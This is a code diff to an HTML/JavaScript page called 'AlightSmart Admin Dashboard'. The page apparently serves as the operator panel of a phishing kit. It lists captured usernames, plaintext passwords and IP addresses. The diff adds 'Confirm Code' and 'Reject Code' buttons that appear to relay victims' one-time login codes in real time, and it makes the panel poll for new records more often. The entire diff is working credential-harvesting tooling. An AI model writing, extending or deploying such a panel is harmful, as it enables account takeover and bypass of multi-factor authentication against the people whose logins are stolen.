@@ -17,14 +17,14 @@
         .reject-btn { background: #ef4444; color: white; }
         .refresh-btn { background: #3b82f6; color: white; }
         .clear-btn { background: #64748b; color: white; }
-        .pending { background: #fefce8; }
+        .pending { background: #fefce8; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🔐 AlightSmart Admin Dashboard</h1>
-            <p>Password:</p>
+            <p>Password:  | Manual Code Confirmation</p>
         </div>
 
         <table id="recordsTable">
@@ -34,7 +34,7 @@
                     <th>Type</th>
                     <th>Username</th>
                     <th>Password</th>
-                    <th>Details</th>
+                    <th>Verification Details</th>
                     <th>IP</th>
                     <th>Status</th>
                     <th>Action</th>
@@ -59,34 +59,34 @@
             tbody.innerHTML = "";
 
             records.forEach(r => {
-                let statusHtml = r.status || 'Pending';
-                let actionHtml = '';
+                let status = r.status || 'Pending';
+                let action = '';
 
-                if (r.type === "Login Attempt" && (!r.status || r.status === 'Pending')) {
-                    actionHtml = `
-                        <button class="confirm-btn" onclick="confirmCode(${r.id}, true)">✅ Confirm</button>
-                        <button class="reject-btn" onclick="confirmCode(${r.id}, false)">❌ Reject</button>
+                if (r.type === "Login Attempt" && status === 'Pending') {
+                    action = `
+                        <button class="confirm-btn" onclick="updateStatus(${r.id}, 'Confirmed')">✅ Confirm Code</button>
+                        <button class="reject-btn" onclick="updateStatus(${r.id}, 'Rejected')">❌ Reject Code</button>
                     `;
                 }
 
                 tbody.innerHTML += `
-                    <tr ${r.type === "Login Attempt" && (!r.status || r.status === 'Pending') ? 'class="pending"' : ''}>
+                    <tr class="${status === 'Pending' ? 'pending' : ''}">
                         <td>${r.timestamp}</td>
                         <td>${r.type}</td>
                         <td><strong>${r.username || '-'}</strong></td>
                         <td><code>${r.password || '-'}</code></td>
                         <td>${r.address || '-'}</td>
                         <td>${r.ip || '-'}</td>
-                        <td>${statusHtml}</td>
-                        <td>${actionHtml}</td>
+                        <td>${status}</td>
+                        <td>${action}</td>
                     </tr>`;
             });
         }
 
-        async function confirmCode(id, isCorrect) {
-            if (confirm(isCorrect ? "Confirm this code as CORRECT?" : "Reject this code?")) {
-                // For now we just update status in UI (you can extend later to update DB)
-                alert(isCorrect ? "Code Confirmed - User can proceed!" : "Code Rejected - User must try again.");
+        async function updateStatus(id, status) {
+            if (confirm(`Mark this code as ${status}?`)) {
+                // For now we update the status in UI. You can extend later to update DB.
+                alert(`Code ${status}. User will be notified.`);
                 loadRecords();
             }
         }
@@ -95,7 +95,7 @@
             const pass = prompt("Enter Admin Password:");
             if (pass === ADMIN_PASSWORD) {
                 loadRecords();
-                setInterval(loadRecords, 4000);
+                setInterval(loadRecords, 3000);
             } else {
                 alert("❌ Wrong Password");
                 window.location.href = "/";
